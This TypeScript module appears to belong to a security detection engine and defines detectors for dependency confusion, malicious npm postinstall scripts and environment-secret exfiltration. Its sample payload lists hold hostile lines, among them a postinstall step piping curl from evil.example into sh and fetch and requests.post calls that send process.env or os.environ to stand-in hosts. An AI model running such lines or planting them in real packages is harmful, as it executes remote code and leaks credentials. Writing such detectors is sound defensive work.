/**
 * Supply-chain and package-manager integrity invariant classes.
 *
 * These classes cover attack paths that endpoint-focused telemetry misses:
 * dependency confusion, script-stage package manager injection, and environment
 * secret exfiltration through build/deployment tooling.
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'
import { l2DependencyConfusion, l2PostinstallInjection, l2EnvExfiltration } from '../../evaluators/l2-adapters.js'


// ── Helpers ──────────────────────────────────────────────────────

const extractDependencyPairs = (input: string): Array<{ name: string; value: string }> => {
    const pairs: Array<{ name: string; value: string }> = []
    const dependencyRegex = /"([^"\n]+)"\s*:\s*"([^"]+)"/g
    let match: RegExpExecArray | null

    while ((match = dependencyRegex.exec(input)) !== null) {
        pairs.push({ name: match[1], value: match[2] })
    }

    return pairs
}

const isLodashTyposquat = (pkg: string): boolean => {
    const base = pkg.split('/').pop() || ''
    const candidate = base.toLowerCase().replace(/[^a-z]/g, '')

    if (candidate.length === 0) return false
    if (candidate === 'lodash') return false
    if (candidate === 'typesnode') return false

    const target = 'lodash'
    if (Math.abs(candidate.length - target.length) > 1) return false

    let i = 0
    let j = 0
    let edits = 0

    while (i < candidate.length && j < target.length) {
        if (candidate[i] === target[j]) {
            i++
            j++
            continue
        }
        edits++
        if (edits > 1) return false

        if (candidate.length > target.length) {
            i++
        } else if (candidate.length < target.length) {
            j++
        } else {
            i++
            j++
        }
    }

    edits += (candidate.length - i) + (target.length - j)
    return edits <= 1
}

const hasDependencyOverrideUrl = (input: string): boolean => {
    if (!/(?:dependencies|devDependencies|optionalDependencies|peerDependencies|bundledDependencies|overrides)/i.test(input)) {
        return false
    }

    for (const { name, value } of extractDependencyPairs(input)) {
        if (name.startsWith('@types/')) continue
        if (!name.startsWith('@') || !name.includes('/')) continue

        if (/(?:npm:|https?:\/\/registry\.npmjs\.org)/i.test(value)) {
            return true
        }
    }

    return false
}

const hasScopedOverrideInstall = (input: string): boolean => {
    const scopedInstallRegex = /\bnpm\s+(?:i|install)\b[^'\n]*\s(@[^\s'"]+\/[^'"\s]+)[^'\n]*--registry\s*=\s*(?:https?:\/\/)?registry\.npmjs\.org/i
    return scopedInstallRegex.test(input)
}

const hasLodashTyposquat = (input: string): boolean => {
    const importRegex = /\bimport\s+[^'"\n]*\s+from\s+['"]([^'"]+)['"]/g
    const requireRegex = /\brequire\(\s*['"]([^'"]+)['"]\s*\)/g

    let match: RegExpExecArray | null
    while ((match = importRegex.exec(input)) !== null) {
        if (!match[1].startsWith('@types/') && isLodashTyposquat(match[1])) {
            return true
        }
    }

    while ((match = requireRegex.exec(input)) !== null) {
        if (!match[1].startsWith('@types/') && isLodashTyposquat(match[1])) {
            return true
        }
    }

    return false
}


// ── 1) dependency_confusion ──────────────────────────────────────

export const dependencyConfusion: InvariantClassModule = {
    id: 'dependency_confusion',
    description: 'Dependency confusion / package squatting via private package names and typosquat dependencies',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.87 },

    mitre: ['T1195.001'],
    cwe: 'CWE-1395',

    knownPayloads: [
        '{"dependencies":{"@my-company/internal-tool":"https://registry.npmjs.org/@my-company/internal-tool/-/internal-tool-1.2.3.tgz"}}',
        'npm install @corp/widget --registry=https://registry.npmjs.org',
        "import lotash from 'lotash'",
    ],

    knownBenign: [
        'import lodash from "lodash"',
        'const express = require("express")',
        '{"devDependencies":{"@types/node":"^20.0.0"}}',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return hasDependencyOverrideUrl(d) || hasScopedOverrideInstall(d) || hasLodashTyposquat(d)
    },

    detectL2: l2DependencyConfusion,

    generateVariants: (count: number): string[] => {
        const v = [
            '{"dependencies":{"@my-company/internal-tool":"https://registry.npmjs.org/@my-company/internal-tool/-/internal-tool-1.2.3.tgz"}}',
            'npm install @corp/widget --registry=https://registry.npmjs.org',
            "import lotash from 'lotash'",
        ]
        return v.slice(0, count)
    },
}


// ── 2) postinstall_injection ─────────────────────────────────────

const hasMaliciousLifecycleScript = (input: string): boolean => {
    const lifecycleScriptRegex = /"(?<name>preinstall|postinstall|install)"\s*:\s*"(?<body>(?:[^"\\]|\\.)*)"/gi
    let match: RegExpExecArray | null

    while ((match = lifecycleScriptRegex.exec(input)) !== null) {
        const body = (match.groups as { name: string; body: string })?.body || ''
        const raw = body.toLowerCase()

        if (/\b(?:curl|wget)\b[^"\n|]*\|\s*(?:sh|bash)\b/.test(raw)) return true
        if (/\bnode\s+-e\b/.test(raw) && /\beval\b/.test(raw)) return true
        if (/\b(eval|sh\s+-c|bash\s+-c)\b/.test(raw) &&
            /(?:\$\(|`[^`]+`|\\x[0-9a-f]{2}|base64)/i.test(raw)) {
            return true
        }
    }

    return false
}

export const postinstallInjection: InvariantClassModule = {
    id: 'postinstall_injection',
    description: 'Malicious package lifecycle scripts (postinstall/preinstall/install) that execute shell payloads',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.90 },

    mitre: ['T1059.006'],
    cwe: 'CWE-94',

    knownPayloads: [
        '{"scripts":{"postinstall":"curl -sSL https://evil.example/payload.sh | sh"}}',
        '{"scripts":{"preinstall":"node -e \\"eval(process.env.CONTACT)\\""}}',
        '{"scripts":{"postinstall":"sh -c eval `printf %s payload`"}}',
    ],

    knownBenign: [
        '{"scripts":{"postinstall":"node scripts/build.js"}}',
        '{"scripts":{"prepare":"husky install"}}',
        'npm run postinstall',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return hasMaliciousLifecycleScript(d)
    },

    detectL2: l2PostinstallInjection,

    generateVariants: (count: number): string[] => {
        const v = [
            '{"scripts":{"postinstall":"curl -sSL https://evil.example/payload.sh | sh"}}',
            '{"scripts":{"preinstall":"node -e \\"eval(process.env.CONTACT)\\""}}',
            '{"scripts":{"postinstall":"sh -c eval `printf %s payload`"}}',
        ]
        return v.slice(0, count)
    },
}


// ── 3) env_exfiltration ────────────────────────────────────────

const hasEnvExfiltration = (input: string): boolean => {
    const lines = input.split(/[\n;\r]+/)

    return lines.some((line) => {
        const hasProcessEnv = /\bprocess\.env\b/.test(line)
        const hasPythonEnv = /\bos\.environ\b/.test(line)
        if (!hasProcessEnv && !hasPythonEnv) return false

        const hasRequestSink = /\b(fetch|axios\.(?:get|post|put|patch|delete)|http\.request|XMLHttpRequest|requests\.post|curl|wget)\b/i.test(line)
        if (!hasRequestSink) return false

        if (/\bprocess\.env\b/.test(line) && /\b(fetch|axios|XMLHttpRequest|http\.request|curl|wget|requests\.post)\b/i.test(line)) return true
        if (/\bos\.environ\b/.test(line) && /\b(requests\.post|fetch|axios|XMLHttpRequest|http\.request|curl|wget)\b/i.test(line)) return true

        return false
    })
}

export const envExfiltration: InvariantClassModule = {
    id: 'env_exfiltration',
    description: 'Environment-variable collection plus outbound request patterns indicating credential/secret exfiltration',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.89 },

    mitre: ['T1114'],
    cwe: 'CWE-201',

    knownPayloads: [
        'fetch("https://exfil.example/collect", {method:"POST", body: JSON.stringify({token: process.env.API_TOKEN})})',
        "requests.post('https://api.example/collect', data=os.environ)",
        'await fetch(`https://exfil/${process.env.BUILD_TOKEN}`, { method: "POST", body: process.env })',
    ],

    knownBenign: [
        'process.env.NODE_ENV',
        'os.environ.get("HOME")',
        'console.log(process.env.NODE_ENV)',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return hasEnvExfiltration(d)
    },

    detectL2: l2EnvExfiltration,

    generateVariants: (count: number): string[] => {
        const v = [
            'fetch("https://exfil.example/collect", {method:"POST", body: JSON.stringify({token: process.env.API_TOKEN})})',
            "requests.post('https://api.example/collect', data=os.environ)",
            'await fetch(`https://exfil/${process.env.BUILD_TOKEN}`, { method: "POST", body: process.env })',
        ]
        return v.slice(0, count)
    },
}
